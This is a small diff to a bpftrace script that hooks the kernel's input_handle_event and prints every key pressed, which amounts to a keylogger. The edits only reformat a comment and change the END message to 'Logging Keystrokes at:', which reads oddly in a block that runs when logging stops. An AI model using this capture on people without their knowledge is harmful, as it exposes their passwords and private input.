@@ -261,13 +261,14 @@ BEGIN {
 kprobe:input_handle_event
 / arg1 == EV_KEY && arg2 < 0x100 && arg3 == 1 /
 {
-  // void input_handle_event(struct input_dev *dev, unsigned int type, unsigned int code, int value
+  // void input_handle_event(struct input_dev *dev,
+	//                         unsigned int type, unsigned int code, int value
 
   printf("%s\n", @translations[arg2]);
 }
 
 END
 {
-  printf("Stopped Logging Keystrokes at: ");
+  printf("Logging Keystrokes at: ");
   time();
 }
